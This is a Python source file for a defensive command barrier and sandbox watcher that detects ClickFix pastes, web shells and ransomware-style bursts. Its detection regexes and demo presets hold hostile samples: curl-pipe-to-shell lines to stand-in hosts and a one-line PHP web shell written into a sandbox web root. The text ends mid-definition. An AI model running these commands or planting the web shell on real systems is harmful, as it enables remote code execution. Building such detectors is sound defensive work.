"""Live security barrier daemon, sandbox watcher, CLI guard, and local web API.

Runs completely in unprivileged user space so researchers and operators on shared Linux nodes
can enforce signed policies, intercept dangerous commands (such as ClickFix social-engineering
pastes), watch sandbox directories for web shells or ransomware bursts, run the 6-engine rootkit
scanner, and inspect live privacy-preserving telemetry (`hmac:...` only) in real time.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import subprocess
import tempfile
import threading
import time
import urllib.error
import urllib.request
from collections import deque
from dataclasses import dataclass
from datetime import UTC, datetime
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

from . import signing
from .calculus import evidence as calc
from .golden import load_golden_cases
from .live_ui import DASHBOARD_HTML
from .pipeline import Pipeline
from .policy import Policy, default_policy_dict
from .policy_io import load_policy_data, read_document, write_signed
from .replay import ReplaySource
from .report import Reporter, action_taken, what_happened
from .rootkit import RootkitScanReport, ScanConfig, evaluate_rootkit_scan
from .schemas import Actor, Decision, EventType, Mode, RawEvent, RawObjectRef
from .tactics import tactics_for

_URL_RE = re.compile(r"https?://([A-Za-z0-9.-]+)(?::\d+)?(/[^\s'\"|;&]*)?")
_PIPE_EXEC_RE = re.compile(r"\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|\|\s*python3?\b|\|\s*perl\b")
_ENCODE_RE = re.compile(r"\b(?:base64\b|-enc\b|fromhex\b|eval\s*\(|xxd\s+-r)")
_PRIV_RE = re.compile(r"(?:^|[;&|]\s*)(?:sudo|su)\b|\bchmod\s+(?:[ugoa]*\+s|[2467][0-7]{3})\b")
_TAMPER_RE = re.compile(
    r"\b(?:pkill|killall)\b.*refmon|\bsystemctl\s+(?:stop|disable)\b|\bufw\s+disable\b"
    r"|\biptables\s+-F\b|\brm\s+-rf\s+/var/log"
)
_PERSIST_RE = re.compile(r"\bcrontab\b|\.(?:bashrc|profile|zshrc)\b|/systemd/system/")
_WEB_EXEC_SUFFIXES = {
    ".php",
    ".phtml",
    ".jsp",
    ".jspx",
    ".asp",
    ".aspx",
    ".sh",
    ".py",
    ".pl",
    ".cgi",
}
_CANARY_CRED = "canary-db-password"
_CANARY_URL = "/admin-backup-old"


def default_live_workdir() -> Path:
    uid = os.getuid() if hasattr(os, "getuid") else 1000
    return Path(tempfile.gettempdir()) / f"refmon-live-{uid}"


@dataclass(frozen=True)
class GuardOutcome:
    story_id: str
    decision: str
    rule_decision: str
    mode: str
    log_odds: float
    executed: bool
    blocked_by_barrier: bool
    failed: dict[str, bool]
    override: str | None
    signals: list[str]
    explanation: str
    output: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "story_id": self.story_id,
            "decision": self.decision,
            "rule_decision": self.rule_decision,
            "mode": self.mode,
            "log_odds": round(self.log_odds, 2),
            "executed": self.executed,
            "blocked_by_barrier": self.blocked_by_barrier,
            "failed": self.failed,
            "override": self.override,
            "signals": self.signals,
            "explanation": self.explanation,
            "output": self.output,
        }


class LiveBarrier:
    """Thread-safe live Reference Monitor barrier with signed policy and sandbox enforcement."""

    def __init__(
        self, workdir: str | Path | None = None, *, golden_dir: Path | None = None
    ) -> None:
        self.workdir = Path(workdir) if workdir is not None else default_live_workdir()
        self.golden_dir = golden_dir or (Path(__file__).resolve().parents[2] / "tests" / "golden")
        self._lock = threading.RLock()
        self._seq = 0
        self._events_count = 0
        self._blocked_count = 0

        self.sandbox_dir = self.workdir / "sandbox"
        self.web_root_dir = self.sandbox_dir / "web_root"
        self.workspace_dir = self.sandbox_dir / "workspace"
        self.secrets_dir = self.sandbox_dir / "secrets"
        self.quarantine_dir = self.workdir / "quarantine"
        self.logs_dir = self.workdir / "logs"

        self.key_path = self.workdir / "admin.key"
        self.pub_path = self.workdir / "admin.pub"
        self.policy_path = self.workdir / "policy.yaml"
        self.events_log_path = self.logs_dir / "events.jsonl"
        self.verdicts_log_path = self.logs_dir / "verdicts.jsonl"
        self.barrier_log_path = self.logs_dir / "barrier.log"

        self._barrier_tail: deque[str] = deque(maxlen=120)
        self._events_tail: deque[str] = deque(maxlen=80)
        self._seen_files: dict[str, tuple[int, int]] = {}
        self._stop_event = threading.Event()
        self._watcher_thread: threading.Thread | None = None

        self._bootstrap_workspace()
        loaded = load_policy_data(self.policy_path, [self._public_key()])
        self.policy: Policy = loaded.policy
        self.policy_digest: str = loaded.digest
        self.signature_ok: bool = True

        device_seed = f"refmon-live-key-{self.workdir}".encode()
        self.pipeline = Pipeline(self.policy, key=device_seed, gate=True)
        self.reporter = Reporter(self.pipeline)
        self.last_rootkit: RootkitScanReport = self._run_rootkit_scan()
        self._snapshot_existing_sandbox()
        self._log_line(
            f"Refmon live barrier ready | mode={self.policy.mode.value} "
            f"| signed_digest={self.policy_digest[:18]}..."
        )

    # -- workspace & signed policy -------------------------------------------------------------

    def _bootstrap_workspace(self) -> None:
        for d in (
            self.web_root_dir,
            self.workspace_dir,
            self.secrets_dir,
            self.quarantine_dir,
            self.logs_dir,
        ):
            d.mkdir(parents=True, exist_ok=True)

        canary_file = self.secrets_dir / "canary-db.conf"
        if not canary_file.exists():
            canary_file.write_text(f"DB_PASS={_CANARY_CRED}\n", encoding="utf-8")

        readme_file = self.workspace_dir / "README.txt"
        if not readme_file.exists():
            readme_file.write_text(
                "Safe Refmon user workspace. Allowed commands execute here.\n",
                encoding="utf-8",
            )

        if not self.key_path.exists() or not self.pub_path.exists():
            priv, pub = signing.generate_keypair()
            self.key_path.write_text(priv + "\n", encoding="utf-8")
            self.key_path.chmod(0o600)
            self.pub_path.write_text(pub + "\n", encoding="utf-8")

        if not self.policy_path.exists():
            pol_dict = default_policy_dict()
            pol_dict["mode"] = "block"
            write_signed(pol_dict, self._private_key(), self.policy_path)

        for log_file in (self.events_log_path, self.verdicts_log_path, self.barrier_log_path):
            log_file.touch(exist_ok=True)

    def _private_key(self) -> str:
        return self.key_path.read_text(encoding="utf-8").strip()

    def _public_key(self) -> str:
        return self.pub_path.read_text(encoding="utf-8").strip()

    def set_mode(self, mode_name: str) -> dict[str, Any]:
        mode = Mode(mode_name.lower())
        with self._lock:
            doc = read_document(self.policy_path)
            unsigned = {k: v for k, v in doc.items() if k != signing.SIGNATURE_FIELD}
            unsigned["mode"] = mode.value
            write_signed(unsigned, self._private_key(), self.policy_path)
            loaded = load_policy_data(self.policy_path, [self._public_key()])
            self.policy = loaded.policy
            self.policy_digest = loaded.digest
            self.signature_ok = True
            self.pipeline.set_policy(self.policy)
            self._log_line(
                f"Signed policy updated -> mode={self.policy.mode.value.upper()} "
                f"({self.policy_digest[:18]}...)"
            )
            return {"mode": self.policy.mode.value, "digest": self.policy_digest}

    # -- logging & event ingestion -------------------------------------------------------------

    def _next_id(self, prefix: str = "ev") -> str:
        self._seq += 1
        return f"{prefix}-{self._seq:05d}"

    def _log_line(self, message: str) -> None:
        stamp = datetime.now(UTC).strftime("%H:%M:%S")
        line = f"[{stamp}] {message}"
        self._barrier_tail.append(line)
        with self.barrier_log_path.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")

    def _make_actor(self, actor_id: str, role: str, user: str, parent: str | None = None) -> Actor:
        return Actor.model_validate(
            {
                "id": actor_id,
                "role": role,
                "interactive": role not in self.policy.server_roles,
                "user": user,
                "parent": parent,
            },
            context={"extra_roles": tuple(self.policy.extra_roles)},
        )

    def _feed_raw_events(self, events: list[RawEvent]) -> tuple[str, Any]:
        last_story_id = ""
        for raw_ev in events:
            outputs = self.pipeline.process(raw_ev)
            observed = self.pipeline.observe.buffer[-1]
            ev_json = observed.to_json_line()
            self._events_count += 1
            self._events_tail.append(ev_json)
            with self.events_log_path.open("a", encoding="utf-8") as ef:
                ef.write(ev_json + "\n")

            reports = self.reporter.consume(outputs)
            for rep in reports:
                v_json = rep.verdict.model_dump_json()
                with self.verdicts_log_path.open("a", encoding="utf-8") as vf:
                    vf.write(v_json + "\n")
                if rep.verdict.decision is Decision.BLOCK:
                    self._blocked_count += 1
                self._log_line(
                    f"VERDICT {rep.verdict.decision.value.upper()} "
                    f"[{rep.verdict.story_id}] L={rep.verdict.log_odds:.2f} nats | "
                    f"{rep.what_happened}"
                )

            # Find the story that contains this observed event.
            for sid, rec in self.pipeline.linker.records.items():
                if rec.events and rec.events[-1].event_id == observed.event_id:
                    last_story_id = sid
                    break

        if not last_story_id and self.pipeline.linker.records:
            last_story_id = next(reversed(self.pipeline.linker.records))
        judgement = self.pipeline.judge(self.pipeline.record(last_story_id))
        return last_story_id, judgement

    def _explain_story(self, story_id: str, judgement: Any) -> str:
        rep = self.reporter.reports.get(story_id)
        if rep is not None:
            return f"{rep.what_happened} {rep.action_taken}"
        rec = self.pipeline.record(story_id)
        verdict = self.pipeline.verdict(rec, judgement)
        sources = {
            str(self.pipeline.tagger.labels[lid].source_class)
            for lid in rec.label_ids
            if lid in self.pipeline.tagger.labels
            and self.pipeline.tagger.labels[lid].source_class is not None
        }
        platform = (
            "server"
            if any(e.actor.role in self.policy.server_roles for e in rec.events)
            else "endpoint"
        )
        what = what_happened(verdict, sources)
        did = action_taken(verdict, [], platform)
        return f"{what} {did}"

    # -- live user command barrier -------------------------------------------------------------

    def guard_command(
        self,
        command: str,
        *,
        origin: str = "web",
        role: str = "interactive_shell",
        execute: bool = False,
        allow_non_block_exec: bool = False,
    ) -> GuardOutcome:
        cmd = command.strip()
        if not cmd:
            raise ValueError("command must not be empty")

        with self._lock:
            now = datetime.now(UTC)
            user = os.environ.get("USER") or "operator"
            device = "dev-b21c" if role in self.policy.server_roles else "dev-7f3a"
            proc_id = self._next_id("proc:guard")
            actor = self._make_actor(proc_id, role, user, parent="proc:session")

            program = _extract_program(cmd)
            hosts, url_paths = _extract_targets(cmd)
            is_encoded = bool(_ENCODE_RE.search(cmd) or _PIPE_EXEC_RE.search(cmd))
            cmd_low = cmd.lower()

            raw_events: list[RawEvent] = []
            if origin and origin != "none":
                if origin == "inbound_request":
                    req_path = (
                        _CANARY_URL
                        if _CANARY_URL in cmd_low
                        else (url_paths[0] if url_paths else "/api/exec")
                    )
                    raw_events.append(
                        RawEvent(
                            event_id=self._next_id(),
                            ts=now,
                            device=device,
                            type=EventType.REQUEST_IN,
                            actor=actor,
                            object=RawObjectRef(class_="http_request", content=cmd),
                            attrs={"source_class": "inbound_request", "url_path": req_path},
                        )
                    )
                else:
                    in_attrs: dict[str, Any] = {"source_class": origin}
                    if hosts:
                        in_attrs["domain"] = hosts[0]
                    raw_events.append(
                        RawEvent(
                            event_id=self._next_id(),
                            ts=now,
                            device=device,
                            type=EventType.CONTENT_IN,
                            actor=actor,
                            object=RawObjectRef(class_="command_text", content=cmd),
                            attrs=in_attrs,
                        )
                    )

            raw_events.append(
                RawEvent(
                    event_id=self._next_id(),
                    ts=now,
                    device=device,
                    type=EventType.EXEC,
                    actor=actor,
                    object=RawObjectRef(class_="command_text", content=cmd),
                    attrs={"program": program, "encoded_payload": is_encoded},
                )
            )

            for host in hosts:
                raw_events.append(
                    RawEvent(
                        event_id=self._next_id(),
                        ts=now,
                        device=device,
                        type=EventType.NET_CONNECT,
                        actor=actor,
                        object=RawObjectRef(class_="net_endpoint", content=host),
                        attrs={"host": host},
                    )
                )

            if "canary-db.conf" in cmd_low or _CANARY_CRED in cmd_low:
                raw_events.append(
                    RawEvent(
                        event_id=self._next_id(),
                        ts=now,
                        device=device,
                        type=EventType.ASSET_ACCESS,
                        actor=actor,
                        object=RawObjectRef(class_="credential_store", content=_CANARY_CRED),
                        attrs={"path_group": "app_secrets"},
                    )
                )
            elif any(k in cmd_low for k in ("/etc/shadow", "app_secrets", ".ssh/id_", "passwords")):
                raw_events.append(
                    RawEvent(
                        event_id=self._next_id(),
                        ts=now,
                        device=device,
                        type=EventType.ASSET_ACCESS,
                        actor=actor,
                        object=RawObjectRef(class_="credential_store", content=cmd),
                        attrs={"path_group": "app_secrets"},
                    )
                )

            if _TAMPER_RE.search(cmd_low):
                obj_cls = "refmon_component" if "refmon" in cmd_low else "security_service"
                raw_events.append(
                    RawEvent(
                        event_id=self._next_id(),
                        ts=now,
                        device=device,
                        type=EventType.SECURITY_TAMPER,
                        actor=actor,
                        object=RawObjectRef(class_=obj_cls, content=cmd),
                    )
                )

            if _PRIV_RE.search(cmd_low):
                raw_events.append(
                    RawEvent(
                        event_id=self._next_id(),
                        ts=now,
                        device=device,
                        type=EventType.PRIV_CHANGE,
                        actor=actor,
                        object=RawObjectRef(class_="privilege", content=cmd),
                    )
                )

            if _PERSIST_RE.search(cmd_low):
                raw_events.append(
                    RawEvent(
                        event_id=self._next_id(),
                        ts=now,
                        device=device,
                        type=EventType.PERSIST,
                        actor=actor,
                        object=RawObjectRef(class_="startup_entry", content=cmd),
                    )
                )

            story_id, j = self._feed_raw_events(raw_events)
            lo = float(j.log_odds if j.log_odds is not None else 0.0)
            blocked_by_barrier = self.policy.mode is Mode.BLOCK and j.decision in (
                Decision.BLOCK,
                Decision.HOLD,
            )
            executed = False
            output = ""

            may_exec_now = (
                execute
                and not blocked_by_barrier
                and (j.decision is Decision.ALLOW or allow_non_block_exec)
            )
            if may_exec_now:
                executed = True
                try:
                    proc = subprocess.run(
                        cmd,
                        shell=True,
                        cwd=str(self.workspace_dir),
                        capture_output=True,
                        text=True,
                        timeout=5.0,
                        check=False,
                    )
                    combined = (proc.stdout + proc.stderr).strip()
                    output = combined[:400]
                except subprocess.TimeoutExpired:
                    output = "[command timed out after 5s]"

            explanation = self._explain_story(story_id, j)
            self._log_line(
                f"GUARD role={role} origin={origin} -> {j.decision.value.upper()} "
                f"(L={lo:.2f} nats, executed={executed})"
            )
            return GuardOutcome(
                story_id=story_id,
                decision=j.decision.value,
                rule_decision=j.rule_decision.value,
                mode=self.policy.mode.value,
                log_odds=lo,
                executed=executed,
                blocked_by_barrier=blocked_by_barrier,
                failed=dict(j.failed),
                override=j.override.value if j.override else None,
                signals=sorted({s.name for s in j.signals}),
                explanation=explanation,
                output=output,
            )

    # -- sandbox directory watcher & quarantine ------------------------------------------------

    def _snapshot_existing_sandbox(self) -> None:
        for root in (self.web_root_dir, self.workspace_dir):
            for path in root.rglob("*"):
                if path.is_file():
                    st = path.stat()
                    self._seen_files[str(path)] = (st.st_mtime_ns, st.st_size)

    def scan_sandbox_once(self) -> list[dict[str, Any]]:
        """Inspect watched sandbox folders for dropped web shells or mass-encryption bursts."""
        incidents: list[dict[str, Any]] = []
        with self._lock:
            now = datetime.now(UTC)
            user = os.environ.get("USER") or "operator"

            # 1. Check web_root for dropped scripts or executables.
            for path in sorted(self.web_root_dir.rglob("*")):
                if not path.is_file():
                    continue
                key = str(path)
                st = path.stat()
                sig = (st.st_mtime_ns, st.st_size)
                if self._seen_files.get(key) == sig:
                    continue
                self._seen_files[key] = sig
                is_exec = _looks_executable_web_file(path, st.st_mode)
                actor = self._make_actor(self._next_id("proc:web"), "web_worker", user)
                events = [
                    RawEvent(
                        event_id=self._next_id(),
                        ts=now,
                        device="dev-b21c",
                        type=EventType.REQUEST_IN,
                        actor=actor,
                        object=RawObjectRef(class_="http_request", content=path.name),
                        attrs={"source_class": "inbound_request", "url_path": "/upload"},
                    ),
                    RawEvent(
                        event_id=self._next_id(),
                        ts=now,
                        device="dev-b21c",
                        type=EventType.FILE_WRITE,
                        actor=actor,
                        object=RawObjectRef(class_="file", content=path.name),
                        attrs={
                            "executable": is_exec,
                            "new_file": True,
                            "web_root": "main_site",
                            "path_group": "web_root",
                        },
                    ),
                ]
                story_id, j = self._feed_raw_events(events)
                quarantined_as = None
                if self.policy.mode is Mode.BLOCK and j.decision in (Decision.BLOCK, Decision.HOLD):
                    quarantined_as = self._quarantine_file(path)
                    self._seen_files.pop(key, None)
                incidents.append(
                    {
                        "kind": "web_root_write",
                        "story_id": story_id,
                        "decision": j.decision.value,
                        "log_odds": round(float(j.log_odds or 0.0), 2),
                        "quarantined": quarantined_as,
                    }
                )

            # 2. Check workspace for mass file modifications (ransomware / wiper burst).
            changed_ws: list[Path] = []
            for path in sorted(self.workspace_dir.rglob("*")):
                if not path.is_file():
                    continue
                key = str(path)
                st = path.stat()
                sig = (st.st_mtime_ns, st.st_size)
                if self._seen_files.get(key) == sig:
                    continue
                self._seen_files[key] = sig
                changed_ws.append(path)

            if changed_ws:
                actor = self._make_actor(self._next_id("proc:ws"), "interactive_shell", user)
                ws_events = [
                    RawEvent(
                        event_id=self._next_id(),
                        ts=now,
                        device="dev-7f3a",
                        type=EventType.FILE_WRITE,
                        actor=actor,
                        object=RawObjectRef(
                            class_="file",
                            content=str(p.relative_to(self.workspace_dir)),
                        ),
                        attrs={"executable": False, "new_file": True, "path_group": "user_docs"},
                    )
                    for p in changed_ws
                ]
                story_id, j = self._feed_raw_events(ws_events)
                incidents.append(
                    {
                        "kind": "workspace_write_batch",
                        "files": len(changed_ws),
                        "story_id": story_id,
                        "decision": j.decision.value,
                        "log_odds": round(float(j.log_odds or 0.0), 2),
                    }
                )
        return incidents

    def _quarantine_file(self, path: Path) -> str:
        stamp = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
        dest = self.quarantine_dir / f"{stamp}_{path.name}.quarantined"
        counter = 1
        while dest.exists():
            dest = self.quarantine_dir / f"{stamp}_{counter}_{path.name}.quarantined"
            counter += 1
        shutil.move(str(path), str(dest))
        dest.chmod(0o400)
        self._log_line(f"QUARANTINED {path.name} -> {dest.name} (mode 0400, preserved safely)")
        return dest.name

    def start_background_watcher(self, interval_s: float = 0.4) -> None:
        if self._watcher_thread is not None and self._watcher_thread.is_alive():
            return
        self._stop_event.clear()

        def _loop() -> None:
            while not self._stop_event.wait(interval_s):
                try:
                    self.scan_sandbox_once()
                except OSError:
                    continue

        self._watcher_thread = threading.Thread(
            target=_loop, name="refmon-sandbox-watcher", daemon=True
        )
        self._watcher_thread.start()

    def stop_background_watcher(self) -> None:
        self._stop_event.set()
        if self._watcher_thread is not None:
            self._watcher_thread.join(timeout=2.0)

    # -- presets, golden scenarios, holds & rootkit --------------------------------------------

    def run_preset(self, name: str) -> dict[str, Any]:
        with self._lock:
            if name == "clickfix":
                out = self.guard_command(
                    "curl -fsSL http://bad.example.invalid/fix-dns.sh | sh",
                    origin="web",
                    role="interactive_shell",
                    execute=False,
                )
                return {
                    **out.to_dict(),
                    "note": "Blocked pasted ClickFix lure before shell ran.",
                }
            if name == "rce":
                out = self.guard_command(
                    "sh -c 'curl -s http://c2.example.invalid/stage2.elf'",
                    origin="inbound_request",
                    role="web_worker",
                    execute=False,
                )
                return {**out.to_dict(), "note": "Server web_worker RCE child shell contained."}
            if name == "webshell":
                shell_file = self.web_root_dir / "cmd_shell.php"
                shell_file.write_text("<?php system($_GET['c']); ?>\n", encoding="utf-8")
                inc = self.scan_sandbox_once()[-1]
                return {
                    "decision": inc["decision"],
                    "log_odds": inc["log_odds"],
                    "note": (
                        f"Dropped cmd_shell.php in web_root -> quarantined as {inc['quarantined']}."
                    ),
                }
            if name == "ransomware":
                batch_dir = self.workspace_dir / f"encrypted_{int(time.time() * 1000)}"
                batch_dir.mkdir(parents=True, exist_ok=True)
                for idx in range(55):
                    (batch_dir / f"doc_{idx:03d}.locked").write_text("cipher\n", encoding="utf-8")
                inc = self.scan_sandbox_once()[-1]
                return {
                    "decision": inc["decision"],
                    "log_odds": inc["log_odds"],
                    "note": "Wrote 55 .locked files in workspace -> mass_change triggered.",
                }
            if name == "canary":
                out = self.guard_command(
                    "cat sandbox/secrets/canary-db.conf",
                    origin="web",
                    role="interactive_shell",
                    execute=False,
                )
                return {
                    **out.to_dict(),
                    "note": "Decoy canary credential touched -> instant OVR-CANARY block.",
                }
            if name == "borderline":
                out = self.guard_command(
                    "curl -s https://mirror.example.org/dataset.tar.gz",
                    origin="none",
                    role="interactive_shell",
                    execute=False,
                )
                return {
                    **out.to_dict(),
                    "note": "Typed fetch to unknown host -> HOLD pending human confirmation.",
                }
            if name == "benign_cmd":
                out = self.guard_command(
                    "ls -la",
                    origin="none",
                    role="interactive_shell",
                    execute=True,
                )
                return {
                    **out.to_dict(),
                    "note": f"Allowed local command executed safely ({len(out.output)} chars).",
                }
            if name == "benign_doc":
                out = self.guard_command(
                    "echo 'hello cluster status ok'",
                    origin="web",
                    role="interactive_shell",
                    execute=True,
                )
                return {
                    **out.to_dict(),
                    "note": "Pasted harmless echo stayed below tau_hold -> ALLOW.",
                }
            raise ValueError(f"unknown preset {name!r}")

    def replay_golden(self, scenario_prefix: str) -> dict[str, Any]:
        wanted = scenario_prefix.strip().upper()
        cases = load_golden_cases(self.golden_dir)
        matched = next(
            (
                c
                for c in cases
                if c.scenario.upper() == wanted or c.scenario.upper().startswith(wanted)
            ),
            None,
        )
        if matched is None:
            return {"error": f"No golden scenario matching {scenario_prefix!r}."}
        with self._lock:
            events = list(ReplaySource(matched.events_path, extra_roles=self.policy.extra_roles))
            # Namespace actor/event ids per replay so repeated runs don't collide in Linker.
            tag = self._next_id("g")
            namespaced = [
                ev.model_copy(
                    update={
                        "event_id": f"{tag}:{ev.event_id}",
                        "actor": ev.actor.model_copy(
                            update={
                                "id": f"{tag}:{ev.actor.id}",
                                "parent": (f"{tag}:{ev.actor.parent}" if ev.actor.parent else None),
                            }
                        ),
                    }
                )
                for ev in events
            ]
            story_id, j = self._feed_raw_events(namespaced)
            lo = round(float(j.log_odds or 0.0), 2)
            title = matched.expected.title
            self._log_line(
                f"GOLDEN {matched.scenario} ({title}) -> {j.decision.value.upper()} "
                f"(expected {matched.expected.decision.value.upper()}, L={lo} nats)"
            )
            return {
                "scenario": f"{matched.scenario}: {title}",
                "story_id": story_id,
                "decision": j.decision.value,
                "expected": matched.expected.decision.value,
                "log_odds": lo,
            }

    def resolve_hold(self, hold_id: str, platform: str, answer: str) -> dict[str, Any]:
        with self._lock:
            if self.pipeline.gate is None:
                raise ValueError("gate is not enabled")
            now = datetime.now(UTC)
            if platform == "server":
                res = self.pipeline.gate.answer_admin(hold_id, answer, now)
            else:
                res = self.pipeline.gate.answer_user(hold_id, answer, now)
            self.reporter.consume(res.actions)
            case = self.pipeline.gate.holds[hold_id]
            self._log_line(
                f"HOLD RESOLVED {hold_id} ({platform}) answer={answer} -> state={case.state.value}"
            )
            return {"hold_id": hold_id, "state": case.state.value, "undo": res.undo}

    def _run_rootkit_scan(self) -> RootkitScanReport:
        report, _ = evaluate_rootkit_scan(
            ScanConfig(passes=2, pass_interval_s=0.01, run_external=False),
            policy=self.policy,
        )
        return report

    def trigger_rootkit_scan(self) -> dict[str, Any]:
        with self._lock:
            self.last_rootkit = self._run_rootkit_scan()
            self._log_line(
                f"ROOTKIT SCAN -> {self.last_rootkit.calculus_decision.value.upper()} "
                f"(L={self.last_rootkit.log_odds:.2f} nats, "
                f"findings={len(self.last_rootkit.findings)})"
            )
            return self.last_rootkit.to_dict()

    # -- dashboard state snapshot --------------------------------------------------------------

    def state_snapshot(self) -> dict[str, Any]:
        with self._lock:
            m = self.policy.math
            prior_lo = round(calc.prior_log_odds(m.prior_attack), 2)
            hold_thr = round(calc.hold_threshold(m.costs, m.hold_catch_rate), 2)
            block_thr = round(calc.block_threshold(m.costs), 2)

            stories = []
            for sid, rec in reversed(list(self.pipeline.linker.records.items())[-25:]):
                j = self.pipeline.judge(rec)
                verdict = self.pipeline.verdict(rec, j)
                stories.append(
                    {
                        "story_id": sid,
                        "events": len(rec.events),
                        "roles": sorted({e.actor.role for e in rec.events}),
                        "decision": j.decision.value,
                        "rule_decision": j.rule_decision.value,
                        "log_odds": round(float(j.log_odds if j.log_odds is not None else 0.0), 2),
                        "failed": dict(j.failed),
                        "override": j.override.value if j.override else None,
                        "signals": sorted({s.name for s in j.signals}),
                        "tactics": list(tactics_for(verdict)),
                        "explanation": self._explain_story(sid, j),
                    }
                )

            holds = []
            if self.pipeline.gate is not None:
                for h in self.pipeline.gate.holds.values():
                    if h.state.value in ("pending", "kept_quarantined"):
                        holds.append(
                            {
                                "hold_id": h.hold_id,
                                "story_id": h.story_id,
                                "platform": h.platform,
                                "state": h.state.value,
                                "can_continue": h.can_continue,
                            }
                        )

            quarantined = sorted(p.name for p in self.quarantine_dir.iterdir() if p.is_file())
            contracts_summary = {
                role: _summarize_contract(c) for role, c in sorted(self.policy.contracts.items())
            }

            return {
                "workdir": str(self.workdir),
                "sandbox_dir": str(self.sandbox_dir),
                "policy_path": str(self.policy_path),
                "counts": {
                    "events": self._events_count,
                    "blocked": self._blocked_count,
                    "pending_holds": len(holds),
                },
                "policy": {
                    "mode": self.policy.mode.value,
                    "signature_ok": self.signature_ok,
                    "digest": self.policy_digest,
                    "prior_lo": prior_lo,
                    "hold_thr": hold_thr,
                    "block_thr": block_thr,
                    "protected_assets": [a.name for a in self.policy.protected_assets],
                    "canaries": [c.name for c in self.policy.canaries],
                    "contracts": contracts_summary,
                },
                "stories": stories,
                "holds": holds,
                "quarantined": quarantined,
                "rootkit": self.last_rootkit.to_dict(),
                "barrier_log": list(self._barrier_tail)[-50:],
                "events_log": list(self._events_tail)[-25:],
            }


def _extract_program(cmd: str) -> str:
    try:
        tokens = shlex.split(cmd)
    except ValueError:
        tokens = cmd.split()
    for tok in tokens:
        if "=" in tok and not tok.startswith(("/", ".")):
            continue
        return Path(tok).name
    return "sh"


def _extract_targets(cmd: str) -> tuple[list[str], list[str]]:
    hosts: list[str] = []
    paths: list[str] = []
    for match in _URL_RE.finditer(cmd):
        host = match.group(1)
        path = match.group(2) or "/"
        if host not in hosts:
            hosts.append(host)
        if path not in paths:
            paths.append(path)
    return hosts, paths


def _looks_executable_web_file(path: Path, mode: int) -> bool:
    if path.suffix.lower() in _WEB_EXEC_SUFFIXES or bool(mode & 0o111):
        return True
    try:
        head = path.read_bytes()[:64]
    except OSError:
        return False
    return head.startswith((b"#!", b"<?php", b"<%"))


def _summarize_contract(contract: Any) -> str:
    parts = []
    if contract.may_exec is not None:
        parts.append(f"exec={list(contract.may_exec)}")
    if contract.external_content_exec:
        parts.append(f"ext_exec={contract.external_content_exec}")
    if contract.may_connect is not None:
        parts.append(f"net={list(contract.may_connect)}")
    if contract.may_write is not None:
        parts.append(f"write={list(contract.may_write)}")
    if contract.may_change_privilege is not None:
        parts.append(f"priv={contract.may_change_privilege}")
    return ", ".join(parts) or "baseline universal rules"


# -- HTTP Server & CLI Client ------------------------------------------------------------------


def make_http_server(
    barrier: LiveBarrier, host: str = "127.0.0.1", port: int = 8765
) -> ThreadingHTTPServer:
    class Handler(BaseHTTPRequestHandler):
        def log_message(self, fmt: str, *args: Any) -> None:
            return  # Keep terminal quiet; barrier.log records security telemetry.

        def _send_json(self, status: int, payload: dict[str, Any]) -> None:
            raw = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(raw)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(raw)

        def _read_json(self) -> dict[str, Any]:
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length) if length > 0 else b"{}"
            return json.loads(body.decode("utf-8"))

        def do_GET(self) -> None:
            if self.path in ("/", "/index.html"):
                raw = DASHBOARD_HTML.encode("utf-8")
                self.send_response(HTTPStatus.OK)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(raw)))
                self.end_headers()
                self.wfile.write(raw)
                return
            if self.path == "/api/state":
                self._send_json(HTTPStatus.OK, barrier.state_snapshot())
                return
            self._send_json(HTTPStatus.NOT_FOUND, {"error": "not found"})

        def do_POST(self) -> None:
            try:
                data = self._read_json()
                if self.path == "/api/guard":
                    outcome = barrier.guard_command(
                        str(data.get("command", "")),
                        origin=str(data.get("origin", "web")),
                        role=str(data.get("role", "interactive_shell")),
                        execute=bool(data.get("execute", False)),
                        allow_non_block_exec=bool(data.get("allow_non_block_exec", False)),
                    )
                    self._send_json(HTTPStatus.OK, outcome.to_dict())
                    return
                if self.path == "/api/preset":
                    res = barrier.run_preset(str(data.get("name", "")))
                    self._send_json(HTTPStatus.OK, res)
                    return
                if self.path == "/api/golden":
                    res = barrier.replay_golden(str(data.get("scenario", "S01")))
                    self._send_json(HTTPStatus.OK, res)
                    return
                if self.path == "/api/hold":
                    res = barrier.resolve_hold(
                        str(data["hold_id"]),
                        str(data.get("platform", "endpoint")),
                        str(data["answer"]),
                    )
                    self._send_json(HTTPStatus.OK, res)
                    return
                if self.path == "/api/mode":
                    res = barrier.set_mode(str(data["mode"]))
                    self._send_json(HTTPStatus.OK, res)
                    return
                if self.path == "/api/rootkit":
                    res = barrier.trigger_rootkit_scan()
                    self._send_json(HTTPStatus.OK, res)
                    return
                self._send_json(HTTPStatus.NOT_FOUND, {"error": "unknown endpoint"})
            except (KeyError, ValueError, OSError) as exc:
                self._send_json(HTTPStatus.BAD_REQUEST, {"error": str(exc)})

    return ThreadingHTTPServer((host, port), Handler)


def send_guard_request(
    command: str,
    *,
    host: str = "localhost",
    port: int = 8765,
    origin: str = "web",
    role: str = "interactive_shell",
    execute: bool = True,
    workdir: str | Path | None = None,
) -> dict[str, Any]:
    """Send a command through the running local daemon, or fall back to an in-process barrier."""
    url = f"http://{host}:{port}/api/guard"
    payload = json.dumps(
        {
            "command": command,
            "origin": origin,
            "role": role,
            "execute": execute,
            "allow_non_block_exec": True,
        }
    ).encode("utf-8")
    req = urllib.request.Request(
        url, data=payload, headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=6.0) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except (urllib.error.URLError, TimeoutError, ConnectionError):
        barrier = LiveBarrier(workdir=workdir)
        return barrier.guard_command(
            command,
            origin=origin,
            role=role,
            execute=execute,
            allow_non_block_exec=True,
        ).to_dict()


def serve_forever(
